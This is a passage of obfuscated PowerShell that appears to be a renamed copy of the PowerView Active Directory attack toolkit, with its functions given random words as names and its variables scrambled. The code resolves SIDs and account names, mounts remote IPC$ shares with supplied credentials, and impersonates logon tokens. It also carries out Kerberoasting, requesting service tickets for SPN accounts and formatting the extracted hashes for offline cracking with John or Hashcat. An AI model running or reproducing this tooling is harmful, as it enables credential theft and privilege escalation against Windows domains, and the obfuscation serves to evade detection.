                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        loomed -FMEdvzGY99 $vsPNMyyw99 @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[chews] Error converting SID '$vsPNMyyw99' : $_"
            }
        }
    }
}
function loomed {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $FMEdvzGY99,
        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $ffAeRAxr99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $dkonnYHz99 = @{
            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
            'NT4'               =   3  # fabrikam\pflynn
            'Display'           =   4  # pflynn
            'DomainSimple'      =   5  # pflynn@fabrikam.com
            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com
            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            'Unknown'           =   8  # unknown type - let the server do translation
            'UPN'               =   9  # pflynn@fabrikam.com
            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn
            'SPN'               =   11 # HTTP/kairomac.contoso.com
            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }
        function Invoke-Method([__ComObject] $Object, [String] $vKlpkKQd99, $hUtaTUtJ99) {
            $MhFNKxWo99 = $Null
            $MhFNKxWo99 = $Object.GetType().InvokeMember($vKlpkKQd99, 'InvokeMethod', $NULL, $Object, $hUtaTUtJ99)
            Write-Output $MhFNKxWo99
        }
        function Get-Property([__ComObject] $Object, [String] $ASzBOQnO99) {
            $Object.GetType().InvokeMember($ASzBOQnO99, 'GetProperty', $NULL, $Object, $NULL)
        }
        function Set-Property([__ComObject] $Object, [String] $ASzBOQnO99, $hUtaTUtJ99) {
            [Void] $Object.GetType().InvokeMember($ASzBOQnO99, 'SetProperty', $NULL, $Object, $hUtaTUtJ99)
        }
        if ($PSBoundParameters['Server']) {
            $CEVXkOBT99 = 2
            $mPqWwyPw99 = $sWbqYnBA99
        }
        elseif ($PSBoundParameters['Domain']) {
            $CEVXkOBT99 = 1
            $mPqWwyPw99 = $StsWGohF99
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $DegNROrc99.GetNetworkCredential()
            $CEVXkOBT99 = 1
            $mPqWwyPw99 = $Cred.Domain
        }
        else {
            $CEVXkOBT99 = 3
            $mPqWwyPw99 = $Null
        }
    }
    PROCESS {
        ForEach ($jpaQfnnt99 in $FMEdvzGY99) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($jpaQfnnt99 -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $gMyzoHXw99 = $dkonnYHz99['DomainSimple']
                }
                else {
                    $gMyzoHXw99 = $dkonnYHz99['NT4']
                }
            }
            else {
                $gMyzoHXw99 = $dkonnYHz99[$ffAeRAxr99]
            }
            $vcsArwUm99 = New-Object -ComObject NameTranslate
            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $DegNROrc99.GetNetworkCredential()
                    Invoke-Method $vcsArwUm99 'InitEx' (
                        $CEVXkOBT99,
                        $mPqWwyPw99,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[loomed] Error initializing translation for '$FMEdvzGY99' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $vcsArwUm99 'Init' (
                        $CEVXkOBT99,
                        $mPqWwyPw99
                    )
                }
                catch {
                    Write-Verbose "[loomed] Error initializing translation for '$FMEdvzGY99' : $_"
                }
            }
            Set-Property $vcsArwUm99 'ChaseReferral' (0x60)
            try {
                $Null = Invoke-Method $vcsArwUm99 'Set' (8, $jpaQfnnt99)
                Invoke-Method $vcsArwUm99 'Get' ($gMyzoHXw99)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[loomed] Error translating '$jpaQfnnt99' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}
function subsidizing {
    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,
        [Switch]
        $CCYYiJjn99
    )
    BEGIN {
        $rkojMJEs99 = New-Object System.Collections.Specialized.OrderedDictionary
        $rkojMJEs99.Add("SCRIPT", 1)
        $rkojMJEs99.Add("ACCOUNTDISABLE", 2)
        $rkojMJEs99.Add("HOMEDIR_REQUIRED", 8)
        $rkojMJEs99.Add("LOCKOUT", 16)
        $rkojMJEs99.Add("PASSWD_NOTREQD", 32)
        $rkojMJEs99.Add("PASSWD_CANT_CHANGE", 64)
        $rkojMJEs99.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $rkojMJEs99.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $rkojMJEs99.Add("NORMAL_ACCOUNT", 512)
        $rkojMJEs99.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $rkojMJEs99.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $rkojMJEs99.Add("SERVER_TRUST_ACCOUNT", 8192)
        $rkojMJEs99.Add("DONT_EXPIRE_PASSWORD", 65536)
        $rkojMJEs99.Add("MNS_LOGON_ACCOUNT", 131072)
        $rkojMJEs99.Add("SMARTCARD_REQUIRED", 262144)
        $rkojMJEs99.Add("TRUSTED_FOR_DELEGATION", 524288)
        $rkojMJEs99.Add("NOT_DELEGATED", 1048576)
        $rkojMJEs99.Add("USE_DES_KEY_ONLY", 2097152)
        $rkojMJEs99.Add("DONT_REQ_PREAUTH", 4194304)
        $rkojMJEs99.Add("PASSWORD_EXPIRED", 8388608)
        $rkojMJEs99.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $rkojMJEs99.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }
    PROCESS {
        $DyNkVDvd99 = New-Object System.Collections.Specialized.OrderedDictionary
        if ($CCYYiJjn99) {
            ForEach ($lLaNpQqS99 in $rkojMJEs99.GetEnumerator()) {
                if ( ($Value -band $lLaNpQqS99.Value) -eq $lLaNpQqS99.Value) {
                    $DyNkVDvd99.Add($lLaNpQqS99.Name, "$($lLaNpQqS99.Value)+")
                }
                else {
                    $DyNkVDvd99.Add($lLaNpQqS99.Name, "$($lLaNpQqS99.Value)")
                }
            }
        }
        else {
            ForEach ($lLaNpQqS99 in $rkojMJEs99.GetEnumerator()) {
                if ( ($Value -band $lLaNpQqS99.Value) -eq $lLaNpQqS99.Value) {
                    $DyNkVDvd99.Add($lLaNpQqS99.Name, "$($lLaNpQqS99.Value)")
                }
            }
        }
        $DyNkVDvd99
    }
}
function orthodoxy {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $FMEdvzGY99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    try {
        if ($PSBoundParameters['Domain'] -or ($FMEdvzGY99 -match '.+\\.+')) {
            if ($FMEdvzGY99 -match '.+\\.+') {
                $prmECTNL99 = $FMEdvzGY99 | loomed -ffAeRAxr99 Canonical
                if ($prmECTNL99) {
                    $VimHoTDO99 = $prmECTNL99.SubString(0, $prmECTNL99.IndexOf('/'))
                    $WQUPVxpP99 = $FMEdvzGY99.Split('\')[1]
                    Write-Verbose "[orthodoxy] Binding to domain '$VimHoTDO99'"
                }
            }
            else {
                $WQUPVxpP99 = $FMEdvzGY99
                Write-Verbose "[orthodoxy] Binding to domain '$StsWGohF99'"
                $VimHoTDO99 = $StsWGohF99
            }
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[orthodoxy] Using alternate credentials'
                $zclAxVXh99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $VimHoTDO99, $DegNROrc99.UserName, $DegNROrc99.GetNetworkCredential().Password)
            }
            else {
                $zclAxVXh99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $VimHoTDO99)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[orthodoxy] Using alternate credentials'
                $lcisPQZY99 = Md | Select-Object -ExpandProperty Name
                $zclAxVXh99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $lcisPQZY99, $DegNROrc99.UserName, $DegNROrc99.GetNetworkCredential().Password)
            }
            else {
                $zclAxVXh99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $WQUPVxpP99 = $FMEdvzGY99
        }
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $zclAxVXh99
        $Out | Add-Member Noteproperty 'Identity' $WQUPVxpP99
        $Out
    }
    catch {
        Write-Warning "[orthodoxy] Error creating binding for object ('$FMEdvzGY99') context : $_"
    }
}
function disservice {
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,
        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99
    )
    BEGIN {
        $IuRiwKzU99 = [Activator]::CreateInstance($aGcPcKVm99)
        $IuRiwKzU99.dwType = 1
    }
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($NkPRaTXB99 in $BoyAErDp99) {
                $NkPRaTXB99 = $NkPRaTXB99.Trim('\')
                $Paths += ,"\\$NkPRaTXB99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($kkUVHmBq99 in $Paths) {
            $IuRiwKzU99.lpRemoteName = $kkUVHmBq99
            Write-Verbose "[disservice] Attempting to mount: $kkUVHmBq99"
            $rKtGlbHQ99 = $Mpr::WNetAddConnection2W($IuRiwKzU99, $DegNROrc99.GetNetworkCredential().Password, $DegNROrc99.UserName, 4)
            if ($rKtGlbHQ99 -eq 0) {
                Write-Verbose "$kkUVHmBq99 successfully mounted"
            }
            else {
                Throw "[disservice] error mounting $kkUVHmBq99 : $(([ComponentModel.Win32Exception]$rKtGlbHQ99).Message)"
            }
        }
    }
}
function moronic {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($NkPRaTXB99 in $BoyAErDp99) {
                $NkPRaTXB99 = $NkPRaTXB99.Trim('\')
                $Paths += ,"\\$NkPRaTXB99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($kkUVHmBq99 in $Paths) {
            Write-Verbose "[moronic] Attempting to unmount: $kkUVHmBq99"
            $rKtGlbHQ99 = $Mpr::WNetCancelConnection2($kkUVHmBq99, 0, $True)
            if ($rKtGlbHQ99 -eq 0) {
                Write-Verbose "$kkUVHmBq99 successfully ummounted"
            }
            else {
                Throw "[moronic] error unmounting $kkUVHmBq99 : $(([ComponentModel.Win32Exception]$rKtGlbHQ99).Message)"
            }
        }
    }
}
function dizzied {
    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99,
        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $iJJxkpFW99,
        [Switch]
        $Quiet
    )
    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[dizzied] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }
    if ($PSBoundParameters['TokenHandle']) {
        $aEMyHuaA99 = $iJJxkpFW99
    }
    else {
        $aEMyHuaA99 = [IntPtr]::Zero
        $qZrfuCcN99 = $DegNROrc99.GetNetworkCredential()
        $GOrSdVAL99 = $qZrfuCcN99.Domain
        $XOIvwKgj99 = $qZrfuCcN99.UserName
        Write-Warning "[dizzied] Executing LogonUser() with user: $($GOrSdVAL99)\$($XOIvwKgj99)"
        $rKtGlbHQ99 = $kLxjtaqc99::LogonUser($XOIvwKgj99, $GOrSdVAL99, $qZrfuCcN99.Password, 9, 3, [ref]$aEMyHuaA99);$ZIbFJfXa99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
        if (-not $rKtGlbHQ99) {
            throw "[dizzied] LogonUser() Error: $(([ComponentModel.Win32Exception] $ZIbFJfXa99).Message)"
        }
    }
    $rKtGlbHQ99 = $kLxjtaqc99::ImpersonateLoggedOnUser($aEMyHuaA99)
    if (-not $rKtGlbHQ99) {
        throw "[dizzied] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $ZIbFJfXa99).Message)"
    }
    Write-Verbose "[dizzied] Alternate credentials successfully impersonated"
    $aEMyHuaA99
}
function enrolled {
    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $iJJxkpFW99
    )
    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[enrolled] Reverting token impersonation and closing LogonUser() token handle"
        $rKtGlbHQ99 = $Kernel32::CloseHandle($iJJxkpFW99)
    }
    $rKtGlbHQ99 = $kLxjtaqc99::RevertToSelf();$ZIbFJfXa99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
    if (-not $rKtGlbHQ99) {
        throw "[enrolled] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $ZIbFJfXa99).Message)"
    }
    Write-Verbose "[enrolled] Token impersonation successfully reverted"
}
function shortens {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $oqRlELxj99 = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $yNuhZIow99 = $User
        }
        else {
            $yNuhZIow99 = $SPN
        }
        ForEach ($Object in $yNuhZIow99) {
            if ($PSBoundParameters['User']) {
                $lnIQOQrT99 = $Object.ServicePrincipalName
                $kQCfdznv99 = $Object.SamAccountName
                $frEwKyFW99 = $Object.DistinguishedName
            }
            else {
                $lnIQOQrT99 = $Object
                $kQCfdznv99 = 'UNKNOWN'
                $frEwKyFW99 = 'UNKNOWN'
            }
            if ($lnIQOQrT99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $lnIQOQrT99 = $lnIQOQrT99[0]
            }
            try {
                $bhdmgSAp99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $lnIQOQrT99
            }
            catch {
                Write-Warning "[shortens] Error requesting ticket for SPN '$lnIQOQrT99' from user '$frEwKyFW99' : $_"
            }
            if ($bhdmgSAp99) {
                $FNgNjxaU99 = $bhdmgSAp99.GetRequest()
            }
            if ($FNgNjxaU99) {
                $Out = New-Object PSObject
                $WnjrUdwM99 = [System.BitConverter]::ToString($FNgNjxaU99) -replace '-'
                $Out | Add-Member Noteproperty 'SamAccountName' $kQCfdznv99
                $Out | Add-Member Noteproperty 'DistinguishedName' $frEwKyFW99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $bhdmgSAp99.ServicePrincipalName
                if($WnjrUdwM99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $EHfrDdEO99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $luKblxfv99 = $Matches.DataToEnd.Substring(0,$EHfrDdEO99*2)
                    if($Matches.DataToEnd.Substring($EHfrDdEO99*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($bhdmgSAp99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($FNgNjxaU99).Replace('-',''))
                    } else {
                        $Hash = "$($luKblxfv99.Substring(0,32))`$$($luKblxfv99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($bhdmgSAp99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($FNgNjxaU99).Replace('-',''))
                }
                if($Hash) {
                    if ($oqRlELxj99 -match 'John') {
                        $XwtEWSsT99 = "`$mAaXqOyO99`$$($bhdmgSAp99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($frEwKyFW99 -ne 'UNKNOWN') {
                            $GOrSdVAL99 = $frEwKyFW99.SubString($frEwKyFW99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $GOrSdVAL99 = 'UNKNOWN'
                        }
                        $XwtEWSsT99 = "`$mAaXqOyO99`$$($Etype)`$*$kQCfdznv99`$$GOrSdVAL99`$$($bhdmgSAp99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $XwtEWSsT99
                }
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }
    END {
        if ($PcHfgoeR99) {
            enrolled -iJJxkpFW99 $PcHfgoeR99
        }
    }
}
function dangling {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $FMEdvzGY99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $oqRlELxj99 = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $jRryQntp99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $jRryQntp99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['LDAPFilter']) { $jRryQntp99['LDAPFilter'] = $YcLdsqIq99 }
        if ($PSBoundParameters['SearchBase']) { $jRryQntp99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $jRryQntp99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $jRryQntp99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $jRryQntp99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $jRryQntp99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $jRryQntp99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $jRryQntp99['Credential'] = $DegNROrc99 }
        if ($PSBoundParameters['Credential']) {
            $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $jRryQntp99['Identity'] = $FMEdvzGY99 }
        Lille @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | shortens -oqRlELxj99 $oqRlELxj99
    }
    END {
        if ($PcHfgoeR99) {
            enrolled -iJJxkpFW99 $PcHfgoeR99
        }
    }
}
function servicewoman {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function Monica {
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )
            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }
            $FZlOrkpK99 = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }
            $xSYinqtw99 = @()
            $xSYinqtw99 += $FZlOrkpK99.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $FZlOrkpK99[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }
            $xSYinqtw99 += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($xSYinqtw99 | Where-Object {$_}) -join ','
        }
        $AcONhXjs99 = @{}
        if ($PSBoundParameters['Credential']) { $AcONhXjs99['Credential'] = $DegNROrc99 }
        $yOPPlUQQ99 = @{}
    }
    PROCESS {
        ForEach ($kkUVHmBq99 in $Path) {
            try {
                if (($kkUVHmBq99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $WSnpkeEP99 = (New-Object System.Uri($kkUVHmBq99)).Host
                    if (-not $yOPPlUQQ99[$WSnpkeEP99]) {
                        disservice -BoyAErDp99 $WSnpkeEP99 -DegNROrc99 $DegNROrc99
                        $yOPPlUQQ99[$WSnpkeEP99] = $True
                    }
                }
                $ACL = Get-Acl -Path $kkUVHmBq99
                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = chews -ObjectSID $SID @ConvertArguments
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $kkUVHmBq99
                    $Out | Add-Member Noteproperty 'FileSystemRights' (Monica -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                Write-Verbose "[servicewoman] error: $_"
            }
        }
    }
    END {
        $yOPPlUQQ99.Keys | moronic
    }
}
function proletarian {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $pwEfoKvn99
    )
    $kVUCshvC99 = @{}
